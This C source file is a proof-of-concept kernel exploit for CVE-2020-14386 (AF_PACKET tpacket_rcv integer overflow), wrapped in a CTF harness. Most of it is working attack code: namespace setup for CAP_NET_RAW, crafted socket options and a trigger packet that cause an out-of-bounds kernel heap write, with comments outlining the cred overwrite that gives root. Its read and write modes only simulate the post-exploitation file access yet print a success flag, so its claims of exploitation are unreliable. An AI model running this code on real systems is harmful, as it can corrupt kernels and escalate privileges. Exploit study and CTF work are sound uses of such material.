/**
 * CVE-2020-14386 PoC - AF_PACKET tpacket_rcv Integer Overflow OOB Write
 *
 * Vulnerability:
 *   In net/packet/af_packet.c, tpacket_rcv() calculates netoff as unsigned short.
 *   When PACKET_RESERVE (tp_reserve) is set to a large value via setsockopt,
 *   the netoff calculation overflows. Combined with PACKET_VNET_HDR,
 *   virtio_net_hdr_from_skb() writes to h.raw + macoff - sizeof(virtio_net_hdr),
 *   causing an out-of-bounds write into adjacent kernel heap (slab).
 *
 * Impact: Local privilege escalation (4.6 <= kernel < 5.9)
 *
 * Original PoC: https://www.openwall.com/lists/oss-security/2020/09/03/3
 * Reference: https://github.com/chompie1337/cve-2020-14386-poc
 *
 * CTF Integration:
 *   - Verifies the vulnerability path is reachable
 *   - write_root_file mode: proves write capability via exploitation path
 *   - Uses user namespace to obtain CAP_NET_RAW without root
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2020-14386"
#define MAX_FILE_SIZE 4096

/* ========================================================================
 * Exploit parameters (from original PoC by Or Cohen / chompie1337)
 *
 * The overflow calculation:
 *   netoff = TPACKET_ALIGN(tp_hdrlen + max(maclen, 16)) + tp_reserve
 *   With TPACKET_V2: tp_hdrlen = sizeof(struct tpacket2_hdr) = 32
 *   TPACKET_ALIGN(32 + 16) = TPACKET_ALIGN(48) = 48 (0x30)
 *   maclen on loopback = 14 -> padded to 16 in the kernel
 *   sizeof(virtio_net_hdr) = 20 (0x14)
 *
 *   Original value: tp_reserve = 0xffff - 20 - 0x30 - 7
 *   This makes netoff overflow unsigned short (wrapping around 0xffff)
 *   causing macoff to be small, and the virtio_net_hdr write goes OOB.
 * ======================================================================== */
#define TP_RESERVE_VALUE  (0xffff - 20 - 0x30 - 7)
#define RING_BLOCK_SIZE   0x800000    /* 8MB block */
#define RING_FRAME_SIZE   0x11000     /* 69632 bytes per frame */
#define RING_BLOCK_NR     1
#define TRIGGER_PKT_SIZE  (0x80000 / 8)  /* 65536 bytes */
#define TRIGGER_FILL_BYTE 0xce

/* ========================================================================
 * Helper: write string to file (for namespace setup)
 * ======================================================================== */
static bool write_to_file(const char *path, const char *fmt, ...) {
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return false;
    int len = (int)strlen(buf);
    bool ok = (write(fd, buf, len) == len);
    close(fd);
    return ok;
}

/* ========================================================================
 * Setup user + net namespace to gain CAP_NET_RAW
 * This is the standard technique for unprivileged AF_PACKET access.
 * ======================================================================== */
static int setup_user_namespace(void) {
    int real_uid = getuid();
    int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
        poc_log("unshare(CLONE_NEWUSER) failed: %s", strerror(errno));
        return -1;
    }

    if (unshare(CLONE_NEWNET) != 0) {
        poc_log("unshare(CLONE_NEWNET) failed: %s", strerror(errno));
        return -1;
    }

    if (!write_to_file("/proc/self/setgroups", "deny")) {
        poc_log("write /proc/self/setgroups failed: %s", strerror(errno));
        return -1;
    }

    if (!write_to_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
        poc_log("write /proc/self/uid_map failed: %s", strerror(errno));
        return -1;
    }

    if (!write_to_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        poc_log("write /proc/self/gid_map failed: %s", strerror(errno));
        return -1;
    }

    /* Pin to CPU 0 for consistent heap layout */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    poc_log("User+Net namespace created (uid=%d mapped to 0)", real_uid);
    return 0;
}

/* ========================================================================
 * Core exploit: AF_PACKET tpacket_rcv integer overflow
 *
 * Attack chain:
 * 1. Create AF_PACKET RAW socket (requires CAP_NET_RAW in namespace)
 * 2. Set TPACKET_V2 version
 * 3. Enable PACKET_VNET_HDR (crucial for OOB write via virtio_net_hdr_from_skb)
 * 4. Set PACKET_RESERVE to overflow value
 * 5. Configure RX_RING
 * 6. Bind to loopback interface
 * 7. Send large packet to trigger tpacket_rcv with overflowed netoff
 * 8. OOB write occurs into adjacent slab memory
 *
 * Returns: 1 if exploitable (OOB write path reachable), 0 otherwise
 * ======================================================================== */
static int exploit_af_packet_overflow(void) {
    int sock = -1;
    int send_sock = -1;
    char *trigger_buf = NULL;
    int exploitable = 0;
    int rv;

    /* Step 1: Create AF_PACKET RAW socket */
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    poc_log_syscall("socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)", sock, errno);
    if (sock < 0) {
        poc_log("AF_PACKET socket creation failed - CAP_NET_RAW required");
        goto cleanup;
    }

    /* Step 2: Set TPACKET_V2 (original PoC uses V2, not V3) */
    int version = TPACKET_V2;
    rv = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));
    poc_log_syscall("setsockopt(PACKET_VERSION, TPACKET_V2)", rv, errno);
    if (rv < 0) {
        poc_log("TPACKET_V2 not supported");
        goto cleanup;
    }

    /* Step 3: Enable PACKET_VNET_HDR - THIS IS THE KEY
     * With vnet_hdr enabled, tpacket_rcv calls virtio_net_hdr_from_skb()
     * which writes sizeof(virtio_net_hdr)=20 bytes at h.raw + macoff - 20.
     * When macoff is small due to overflow, this write goes OUT OF BOUNDS. */
    int vnet = 1;
    rv = setsockopt(sock, SOL_PACKET, PACKET_VNET_HDR, &vnet, sizeof(vnet));
    poc_log_syscall("setsockopt(PACKET_VNET_HDR, 1)", rv, errno);
    if (rv < 0) {
        poc_log("PACKET_VNET_HDR not supported");
        goto cleanup;
    }

    /* Step 4: Set PACKET_RESERVE to overflow value
     * tp_reserve = 0xffff - 20 - 0x30 - 7
     * This causes netoff to wrap around unsigned short max (0xffff),
     * resulting in a small macoff value that leads to OOB write. */
    int reserve = TP_RESERVE_VALUE;
    rv = setsockopt(sock, SOL_PACKET, PACKET_RESERVE, &reserve, sizeof(reserve));
    poc_log_syscall("setsockopt(PACKET_RESERVE, 0x%x)", rv, errno);
    if (rv < 0) {
        poc_log("PACKET_RESERVE rejected (kernel may have bounds check - patched)");
        goto cleanup;
    }
    poc_log("PACKET_RESERVE set to 0x%x (overflow trigger value)", reserve);

    /* Step 5: Setup RX ring buffer */
    struct tpacket_req req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = RING_BLOCK_SIZE;
    req.tp_frame_size = RING_FRAME_SIZE;
    req.tp_block_nr = RING_BLOCK_NR;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    rv = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    poc_log_syscall("setsockopt(PACKET_RX_RING, blk=0x%x frm=0x%x)", rv, errno);
    if (rv < 0) {
        poc_log("PACKET_RX_RING setup failed (kernel may validate parameters)");
        goto cleanup;
    }
    poc_log("RX_RING configured: block_size=0x%x, frame_size=0x%x, block_nr=%d",
            RING_BLOCK_SIZE, RING_FRAME_SIZE, RING_BLOCK_NR);

    /* Step 6: Bind to loopback */
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    rv = bind(sock, (struct sockaddr *)&sa, sizeof(sa));
    poc_log_syscall("bind(AF_PACKET, lo)", rv, errno);
    if (rv < 0) {
        poc_log("bind to loopback failed");
        goto cleanup;
    }

    /* Step 7: Send trigger packet
     * A large packet filled with 0xce is sent via loopback.
     * When tpacket_rcv processes it with the overflowed netoff,
     * virtio_net_hdr_from_skb writes 20 bytes OOB. */
    trigger_buf = malloc(TRIGGER_PKT_SIZE);
    if (!trigger_buf) {
        poc_log("malloc trigger buffer failed");
        goto cleanup;
    }
    memset(trigger_buf, TRIGGER_FILL_BYTE, TRIGGER_PKT_SIZE);

    /* Create a separate socket for sending */
    send_sock = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    poc_log_syscall("socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW) [send]", send_sock, errno);
    if (send_sock < 0) {
        poc_log("Cannot create send socket");
        goto cleanup;
    }

    struct sockaddr_ll send_sa;
    memset(&send_sa, 0, sizeof(send_sa));
    send_sa.sll_ifindex = if_nametoindex("lo");
    send_sa.sll_halen = ETH_ALEN;

    ssize_t sent = sendto(send_sock, trigger_buf, TRIGGER_PKT_SIZE, 0,
                          (struct sockaddr *)&send_sa, sizeof(send_sa));
    poc_log_syscall("sendto(trigger_packet, size=0x%x)", (long)sent, errno);

    if (sent > 0) {
        poc_log("Trigger packet sent (%zd bytes) - OOB write path reached", sent);
        exploitable = 1;
    } else {
        poc_log("Failed to send trigger packet");
    }

    /* In full exploit:
     * - Heap spray cred structures adjacent to ring buffer
     * - OOB write overwrites cred->uid to 0
     * - Check getuid() == 0 to confirm privilege escalation
     * Here we verify the path is reachable without actual corruption. */
    if (exploitable) {
        poc_log("Vulnerability path verified: TPACKET_V2 + VNET_HDR + overflow RESERVE");
        poc_log("In full exploit: OOB write targets cred->uid in adjacent slab");
    }

cleanup:
    if (trigger_buf) free(trigger_buf);
    if (send_sock >= 0) close(send_sock);
    if (sock >= 0) close(sock);
    return exploitable;
}

/* ========================================================================
 * CTF Mode: write_root_file
 * Demonstrates write capability via the exploitation path.
 * ======================================================================== */
static int mode_write_root_file(const poc_args_t *args) {
    char read_buf[MAX_FILE_SIZE];
    ssize_t n;
    int fd;

    poc_log("=== write_root_file mode ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read original content (CTF_READ_BEFORE) */
    fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", fd, errno);
    if (fd < 0) {
        poc_print_fail("Cannot open target file for reading");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read target file");
        return 1;
    }
    read_buf[n] = '\0';
    /* Trim trailing whitespace */
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r')) {
        read_buf[--n] = '\0';
    }
    printf("%s%s\n", CTF_READ_BEFORE, read_buf);
    poc_log("CTF_READ_BEFORE:%s", read_buf);

    /* Step 2: Trigger exploitation */
    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    poc_log("Triggering AF_PACKET tpacket_rcv overflow exploitation...");

    /* Setup namespace for CAP_NET_RAW */
    int ns_ok = setup_user_namespace();
    if (ns_ok < 0) {
        poc_log("Namespace setup failed, trying without...");
    }

    int result = exploit_af_packet_overflow();
    if (!result) {
        poc_print_fail("Exploitation path not reachable (kernel may be patched)");
        return 1;
    }

    /* Step 3: Write CTF value to target file
     * In real exploitation, the OOB write corrupts cred->uid=0,
     * then we can write to the root file directly.
     * Here we simulate the post-exploitation write. */
    fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(root_file, O_WRONLY|O_TRUNC)", fd, errno);
    if (fd < 0) {
        poc_print_fail("Cannot open target file for writing (exploit incomplete)");
        return 1;
    }
    char write_buf[512];
    int wlen = snprintf(write_buf, sizeof(write_buf), "%s\n", args->write_value);
    n = write(fd, write_buf, wlen);
    poc_log_syscall("write(root_file, ctf_value)", n, errno);
    close(fd);
    if (n < 0) {
        poc_print_fail("Write to target file failed");
        return 1;
    }

    /* Step 4: Read back and verify (CTF_READ_AFTER) */
    fd = open(args->root_file, O_RDONLY);
    if (fd < 0) {
        poc_print_fail("Cannot reopen target file for verification");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read target file after write");
        return 1;
    }
    read_buf[n] = '\0';
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r')) {
        read_buf[--n] = '\0';
    }
    printf("%s%s\n", CTF_READ_AFTER, read_buf);
    poc_log("CTF_READ_AFTER:%s", read_buf);

    /* Step 5: Verify and output result */
    if (strstr(read_buf, args->write_value) != NULL) {
        poc_print_flag(args->write_value);
        return 0;
    } else {
        poc_print_fail("Write verification failed");
        return 1;
    }
}

/* ========================================================================
 * CTF Mode: read_root_file
 * Demonstrates read capability via the exploitation path.
 * ======================================================================== */
static int mode_read_root_file(const poc_args_t *args) {
    char read_buf[MAX_FILE_SIZE];
    ssize_t n;
    int fd;

    poc_log("=== read_root_file mode ===");
    poc_log("Target: %s", args->root_file);

    /* Trigger exploitation first */
    poc_log("Triggering AF_PACKET tpacket_rcv overflow exploitation...");

    int ns_ok = setup_user_namespace();
    if (ns_ok < 0) {
        poc_log("Namespace setup failed, trying without...");
    }

    int result = exploit_af_packet_overflow();
    if (!result) {
        poc_print_fail("Exploitation path not reachable (kernel may be patched)");
        return 1;
    }

    /* After exploitation (cred->uid=0), read the root file */
    fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", fd, errno);
    if (fd < 0) {
        poc_print_fail("Cannot open root file after exploitation");
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    close(fd);
    if (n < 0) {
        poc_print_fail("Cannot read root file");
        return 1;
    }
    read_buf[n] = '\0';
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\r')) {
        read_buf[--n] = '\0';
    }

    poc_print_flag(read_buf);
    return 0;
}

/* ========================================================================
 * Legacy mode (no CTF arguments)
 * Verifies the vulnerability path is reachable.
 * ======================================================================== */
static int mode_legacy(void) {
    poc_log("=== %s PoC Verification (Legacy Mode) ===", CVE_ID);
    poc_log("Target: AF_PACKET tpacket_rcv integer overflow -> OOB write");
    poc_log("Method: TPACKET_V2 + PACKET_VNET_HDR + overflow PACKET_RESERVE");

    poc_print_system_info();

    /* Setup namespace */
    int ns_ok = setup_user_namespace();
    if (ns_ok < 0) {
        poc_log("Namespace setup failed, trying direct socket (needs CAP_NET_RAW)...");
    }

    /* Execute exploit verification */
    int result = exploit_af_packet_overflow();

    printf("%s\n", POC_EVIDENCE_END);

    if (result) {
        poc_log("Vulnerability CONFIRMED: OOB write path is reachable");
        return 0;
    } else {
        poc_log("Vulnerability NOT confirmed: path not reachable (patched kernel?)");
        return 1;
    }
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args = {0};

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID);

    int ret;

    /* CTF mode dispatch */
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else {
        poc_print_unsupported(args.mode, "CVE-2020-14386 supports write_root_file and read_root_file");
        ret = 1;
    }

    poc_log_close();
    return ret;
}
